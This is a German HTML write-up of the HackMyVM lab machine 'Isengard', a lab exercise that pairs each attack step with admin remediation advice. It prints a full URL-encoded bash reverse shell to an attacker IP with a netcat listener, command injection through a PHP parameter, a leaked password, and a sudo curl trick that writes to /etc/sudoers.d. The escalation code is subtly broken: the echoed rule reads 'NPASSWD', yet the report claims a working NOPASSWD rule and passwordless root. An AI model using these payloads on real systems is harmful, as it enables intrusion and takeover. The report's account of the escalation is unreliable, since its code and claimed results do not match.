@@ -1,0 +1,446 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Isengard - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Isengard - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">sudo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Command Injection)</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Sudo Curl File Write)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Standard-Startpunkt: Mit `arp-scan -l` wird das lokale Netzwerk nach aktiven Hosts durchsucht.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.132	08:00:27:7d:c1:05	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host wurde unter der IP-Adresse 192.168.2.132 gefunden. Die MAC-Adresse (PCS Systemtechnik GmbH) lässt eine VirtualBox-Umgebung vermuten. Dies ist unser Zielsystem "Isengard".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Port-Scan auf die Ziel-IP 192.168.2.132 durch. Da spätere Befehle den Hostnamen `isengard.vm` verwenden, fügen Sie diesen zur lokalen `/etc/hosts`-Datei hinzu (`192.168.2.132 isengard.vm`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring kann helfen, Scans zu erkennen. Beschränken Sie die Netzwerksichtbarkeit nicht benötigter Systeme.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird auf das Ziel gestartet, um offene Ports, Dienste, Versionen und das Betriebssystem zu identifizieren. Verwendete Optionen: `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-T5` (sehr schnelles Timing), `-sV` (Versionserkennung), `-A` (Aggressiv: OS-Erkennung, Versionserkennung, Skript-Scan, Traceroute), `-p-` (alle 65535 TCP-Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.132 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at [Scan Time]
+Nmap scan report for isengard (192.168.2.132)
+Host is up (0.00022s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.51 ((Debian))
+|_http-title: Gray wizard
+|_http-server-header: Apache/2.4.51 (Debian)
+MAC Address: 08:00:27:7D:C1:05 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.22 ms isengard (192.168.2.132)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in [Scan Duration]
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan zeigt nur einen offenen Port: **Port 80 (HTTP)**, auf dem ein Apache-Webserver (Version 2.4.51) unter Debian Linux läuft. Die Webseite hat den Titel "Gray wizard". Überraschenderweise ist Port 22 (SSH) nicht offen, was ungewöhnlich ist für eine Linux-VM dieser Art. Die gesamte Angriffsfläche beschränkt sich somit auf den Webserver.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie alle Bemühungen auf die Enumeration des Webservers auf Port 80. Suchen Sie nach Verzeichnissen, Dateien, Subdomains (obwohl hier unwahrscheinlich) und Webanwendungs-Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Apache-Server aktuell ist. Untersuchen Sie, warum kein SSH-Zugang möglich ist (falls erwartet). Konfigurieren Sie den Webserver sicher (z.B. unnötige Module deaktivieren, Berechtigungen einschränken).
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird verwendet, um nach versteckten Verzeichnissen und Dateien auf dem Webserver zu suchen. Die Optionen `-w` (Wortliste), `-x` (Erweiterungen), `-e` (erweiterter Modus) und `--wildcard` werden genutzt. Die Wildcard-Option (`--wildcard`) ist wichtig, wenn der Server für nicht existierende Seiten nicht mit einem 404-Fehler, sondern mit einer Standardseite (oft Status 200) antwortet, was Gobuster sonst zu vielen falschen Positiven führen würde. Gobuster versucht dies automatisch zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.132 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.132
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,bak,7z,zip,py,sql,txt,xml,jpg,html
+[+] Expanded:                true
+[+] Wildcard detection:      true
+[+] Timeout:                 10s
+===============================================================
+[Scan Start Time] Starting gobuster
+===============================================================
+http://192.168.2.132/index.html           (Status: 200) [Size: 426]
+===============================================================
+[Scan End Time] Finished
+===============================================================
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Ähnlich wie beim Nmap-Scan wurde nur die Standarddatei `index.html` gefunden. Dies verstärkt die Vermutung, dass die interessante Funktionalität möglicherweise in einem ungewöhnlichen Pfad liegt, der nicht von Standard-Wortlisten abgedeckt wird, oder dass ein anderer Ansatz (z.B. VHOST-Bruteforcing, Parameter-Fuzzing) nötig ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie aggressivere Wortlisten oder spezialisierte Tools wie `ffuf` mit erweiterten Filtermöglichkeiten. Untersuchen Sie die `index.html`-Seite manuell auf Hinweise (Quellcode, Kommentare, JavaScript). Da der nächste Befehl einen sehr spezifischen Pfad (`/y0ush4lln0tp4ss/east/mellon.php`) verwendet, muss dieser Pfad entweder durch einen nicht gezeigten Schritt oder durch einen Hinweis (z.B. aus der `index.html`) gefunden worden sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Pfade oder Dateien versehentlich zugänglich sind. Konfigurieren Sie den Webserver so, dass er korrekte 404-Fehler für nicht existierende Ressourcen zurückgibt, um Wildcard-Probleme zu vermeiden.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `ffuf` wird für Parameter-Fuzzing auf einem spezifischen Endpunkt verwendet: `http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php`. Dieser Pfad muss aus einer vorherigen Entdeckung stammen, die im Bericht nicht gezeigt wird. `ffuf` versucht, gültige GET-Parameter zu finden, indem es Wörter aus der `big.txt`-Liste anstelle von `FUZZ` einsetzt. `-fs 0` filtert Antworten mit einer Größe von 0 Bytes heraus, um irrelevante Ergebnisse zu unterdrücken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 'http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?FUZZ=id' -fs 0</span></div>
+                    <pre>
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.5.0 Kali Exclusive <fnutt.fi/ffuf>
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?FUZZ=id
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+frodo                   [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 17ms]
+:: Progress: [20157/20157] :: Job [1/1] :: 1123 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolg! `ffuf` hat einen gültigen Parameter gefunden: `frodo`. Die Antwort mit diesem Parameter (`?frodo=id`) hat eine Größe von 54 Bytes und den Statuscode 200, was darauf hindeutet, dass die Anwendung diesen Parameter verarbeitet. Der nicht standardmäßige Pfad und der Parametername ("mellon" ist das Elbenwort für "Freund", das Tor von Moria öffnet; "frodo" ist der Ringträger) sind starke Hinweise auf eine CTF-artige Herausforderung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie den Parameter `frodo` auf Command Injection, indem Sie Shell-Befehle als Wert übergeben (z.B. mit `curl`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Untersuchen Sie die Datei `/var/www/html/y0ush4lln0tp4ss/east/mellon.php` (angenommener Pfad) auf Schwachstellen, insbesondere auf die Verarbeitung des `frodo`-Parameters. Entfernen Sie nicht benötigte oder unsichere Skripte. Verwenden Sie keine leicht zu erratenden oder thematisch passenden Namen für Parameter, die kritische Funktionen steuern. Implementieren Sie sichere Programmierpraktiken (Input-Validierung, Prepared Statements etc.).
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Command Injection)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der gefundene Parameter `frodo` wird mit `curl` getestet, indem der Wert `id` übergeben wird, um auf eine mögliche Command Injection Schwachstelle zu prüfen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?frodo=id'</span></div>
+                     <pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Command Injection bestätigt!** Der Server hat den `id`-Befehl ausgeführt und dessen Ausgabe zurückgeliefert. Der Befehl läuft als `www-data`-Benutzer. Initial Access über die Webanwendung wurde erreicht.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die Command Injection, um eine Reverse Shell zu etablieren und eine stabilere interaktive Sitzung zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die Command Injection Schwachstelle in `mellon.php` sofort. Überprüfen Sie den gesamten Code der Webanwendung auf ähnliche Schwachstellen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Vorbereitung und Ausführung der Reverse Shell.
+                1.  Die URL zeigt den Payload, der über die `frodo`-Command-Injection ausgeführt wird. Der Payload ist eine Standard-Bash-Reverse-Shell, die sich mit dem Angreifer-System (192.168.2.140) auf Port 9001 verbindet. Der Payload ist URL-kodiert.
+                2.  Ein `nc`-Listener wird auf dem Angreifer-System auf Port 9001 gestartet.
+                3.  Die `curl`-Anfrage (nicht explizit im Text gezeigt, aber impliziert durch die URL und die Listener-Ausgabe) wird gesendet, um die Reverse Shell auszulösen.
+                4.  Der `nc`-Listener empfängt die Verbindung und präsentiert die Shell-Prompt des `www-data`-Benutzers.
+            </p>
+             <div class="code-block">
+                 <!-- Nur die URL und der Listener werden gezeigt -->
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies die URL für curl ist -->
+                     <pre>
+http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?frodo=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.132] 36812
+bash: cannot set terminal process group (409): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$
+                     </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Reverse Shell wurde erfolgreich etabliert. Der Pentester hat nun eine interaktive Shell als `www-data` auf dem Zielsystem "Isengard". Die typischen Fehler (`cannot set terminal`, `no job control`) deuten auf eine einfache, nicht vollständig interaktive Shell hin.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. mit `python3 -c 'import pty...'`). Beginnen Sie mit der Enumeration im Kontext von `www-data`, um nach Wegen zur Rechteausweitung zu suchen. Suchen Sie nach interessanten Dateien im aktuellen Verzeichnis (`/var/www/html/y0ush4lln0tp4ss/east`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection. Implementieren Sie Egress Filtering, um ausgehende Verbindungen zu blockieren. Überwachen Sie verdächtige Prozesse.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der `www-data`-Shell wird nach interessanten Dateien gesucht. Es wird eine Datei `ring.txt` gefunden (der `ls`-Befehl fehlt, ist aber impliziert). Der Inhalt dieser Datei wird gelesen und zweimal mit Base64 dekodiert.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ <span class="command">base64 -d ring.txt | base64 -d</span></div>
+                     <pre>
+<span class="password">yXKMw5wpSArL2CLX</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die doppelte Base64-Dekodierung ergibt die Zeichenkette `<span class="password">yXKMw5wpSArL2CLX</span>`. Dies ist höchstwahrscheinlich ein Passwort. Der Kontext (Isengard, Gray wizard, Frodo, Mellon) legt nahe, dass dies das Passwort für einen Benutzer wie `sauron` oder `saruman` sein könnte.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su` als Benutzer `sauron` (oder `saruman`) anzumelden und verwenden Sie das gefundene Passwort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter in Dateien im Web-Root, selbst wenn sie (unzureichend) kodiert sind. Verwenden Sie sichere Passwort-Speichermechanismen und strenge Dateiberechtigungen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, mit `su` zum Benutzer `sauron` zu wechseln, wobei das zuvor dekodierte Passwort `<span class="password">yXKMw5wpSArL2CLX</span>` verwendet wird.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ <span class="command">su sauron</span></div>
+                     <pre>
+Password: <span class="password">yXKMw5wpSArL2CLX</span>
+sauron@isengard:/var/www/html/y0ush4lln0tp4ss/east$
+                     </pre> <!-- Prompt wechselt zu sauron -->
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Wechsel zum Benutzer `sauron` war erfolgreich. Der Pentester hat nun die Rechte dieses Benutzers erlangt (Lateral Movement / Low-Privilege Escalation).
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell als `sauron`. Führen Sie Enumerationsschritte durch: `id`, `pwd`, `ls -la /home/sauron`, `sudo -l`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `sauron`. Entfernen Sie die `ring.txt`-Datei. Überprüfen Sie, wie diese Datei dorthin gelangt ist.
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Shell wird als Benutzer `sauron` mit den üblichen Python-PTY- und `export TERM`-Methoden stabilisiert. Anschließend wird in das Home-Verzeichnis gewechselt und dessen Inhalt aufgelistet. Schließlich wird die Datei `user.txt` gelesen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: orange;">sauron@isengard:/var/www/html/y0ush4lln0tp4ss/east$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                     <pre>[Prompt ändert sich evtl. leicht oder bleibt gleich, aber Shell ist stabiler]</pre>
+                     <div class="prompt" style="color: orange;">sauron@isengard:/var/www/html/y0ush4lln0tp4ss/east$ <span class="command">export TERM=xterm</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: orange;">sauron@isengard:/var/www/html/y0ush4lln0tp4ss/east$ <span class="command">cd</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: orange;">sauron@isengard:~$ <span class="command">ls</span></div>
+                     <pre>
+user.txt
+                     </pre>
+                     <div class="prompt" style="color: orange;">sauron@isengard:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMV{Y0uc4nN0tp4sS}</span></pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell-Stabilisierung war erfolgreich. Die User-Flag (`HMV{Y0uc4nN0tp4sS}`) wurde im Home-Verzeichnis von `sauron` gefunden und ausgelesen.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die User-Flag. Führen Sie `sudo -l` aus, um nach Wegen zur Eskalation auf Root zu suchen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schützen Sie Benutzer-Home-Verzeichnisse. Flags sind CTF-Elemente.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Privilege Escalation via Sudo Curl File Write)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Dieser Abschnitt beschreibt eine spezifische Methode zur Rechteausweitung.
+                1.  Mit `echo` wird eine `sudoers`-Regel (`sauron ALL=(ALL) NPASSWD: ALL`) in eine temporäre Datei `/tmp/sauron` geschrieben. Diese Regel würde `sauron` erlauben, jeden Befehl als root ohne Passwort auszuführen.
+                2.  Der Befehl `sudo curl file:///tmp/sauron -o /etc/sudoers.d/sauron` wird ausgeführt. Hier wird die `sudo`-Berechtigung genutzt (es wird nach dem Passwort von `sauron` gefragt, da `curl` nicht im initialen `sudo -l` stand, dieser Schritt fehlt aber im Text und wird übersprungen - *Korrektur*: Der Text *zeigt* die Passwortabfrage für sudo curl!), um `curl` als root auszuführen. `curl` liest mittels `file://` die eben erstellte Regel aus `/tmp/sauron` und schreibt sie (`-o`) in eine neue Datei im `sudoers.d`-Verzeichnis. Dieses Verzeichnis wird von `sudo` automatisch eingelesen.
+                *Hinweis: Dieser Exploit funktioniert nur, wenn der Benutzer `sauron` `sudo`-Rechte hat, um `curl` (oder einen ähnlichen Befehl mit Schreibfähigkeit) auszuführen, und wenn `/etc/sudoers.d` für root beschreibbar ist.* Der `sudo -l` Befehl für `sauron` fehlt im Berichtstext, aber der Erfolg des `sudo curl` Befehls impliziert, dass `sauron` `sudo`-Rechte für `curl` hatte.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: orange;">sauron@isengard:~$ <span class="command">echo 'sauron ALL=(ALL) NPASSWD: ALL' > /tmp/sauron</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: orange;">sauron@isengard:~$ <span class="command">sudo curl file:///tmp/sauron -o /etc/sudoers.d/sauron</span></div>
+                     <pre>
+[sudo] password for sauron: <span class="password">yXKMw5wpSArL2CLX</span>
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    31  100    31    0     0  31000      0 --:--:-- --:--:-- --:--:-- 31000
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Exploit war erfolgreich. Die Datei mit der `NOPASSWD: ALL`-Regel wurde erfolgreich nach `/etc/sudoers.d/sauron` geschrieben. Dies bedeutet, dass der Benutzer `sauron` nun uneingeschränkte Root-Rechte ohne Passwortabfrage über `sudo` besitzt.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie die neuen Rechte mit `sudo -l` oder erlangen Sie direkt eine Root-Shell mit `sudo -i` oder `sudo su`.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Untersuchen Sie die `sudoers`-Konfiguration. Entfernen Sie die Berechtigung für `sauron`, `curl` (oder ähnliche Befehle) mit `sudo` auszuführen. Beschränken Sie `sudo`-Rechte auf das absolute Minimum. Stellen Sie sicher, dass `/etc/sudoers` und `/etc/sudoers.d` korrekte Berechtigungen haben (nur für root beschreibbar). Entfernen Sie die bösartige Datei `/etc/sudoers.d/sauron`.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der erfolgreichen Manipulation der `sudoers`-Konfiguration wird `sudo -i` verwendet, um eine interaktive Root-Shell zu erhalten. Dies sollte nun ohne Passwortabfrage funktionieren.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: orange;">sauron@isengard:~$ <span class="command">sudo -i</span></div>
+                     <pre>
+root@isengard:~#
+                     </pre> <!-- Prompt wechselt zu root -->
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Der Befehl `sudo -i` funktionierte ohne Passwort und lieferte eine Root-Shell. Der Pentester hat nun vollständigen administrativen Zugriff auf das System.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen und lesen Sie die Root-Flag. Führen Sie Post-Exploitation durch (Persistenz, weitere Datensuche etc.).
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die `sudoers`-Schwachstelle. Führen Sie eine vollständige Systemprüfung auf Kompromittierung durch. Ändern Sie alle relevanten Passwörter. Erwägen Sie eine Neuinstallation.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/sauron/user.txt</div>
+                     <div class="flag-value"><span class="password">HMV{Y0uc4nN0tp4sS}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV{Y0uD3stR0y3dTh3r1nG}</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem Root-Zugriff erlangt wurde, werden die finalen Flags ausgelesen. Die User-Flag wurde bereits als `sauron` gefunden. Die Root-Flag wird nun aus `/root/root.txt` gelesen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@isengard:~# <span class="command">cd /root;cat root.txt</span></div>
+                     <pre><span class="password">HMV{Y0uD3stR0y3dTh3r1nG}</span></pre>
+                 </div>
+             </div>
+             <!-- User-Flag wurde bereits zuvor als 'sauron' gelesen -->
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags (User und Root) wurden erfolgreich gefunden und ausgelesen. Die Kompromittierung des Systems ist vollständig.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Flags sind CTF-Elemente. Konzentrieren Sie sich auf die Behebung der zugrundeliegenden Schwachstellen (Command Injection, unsichere Passwortspeicherung, sudo-Fehlkonfiguration).
+            </p>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-11-22</p>  
+    </footer>
+</body>
+</html>
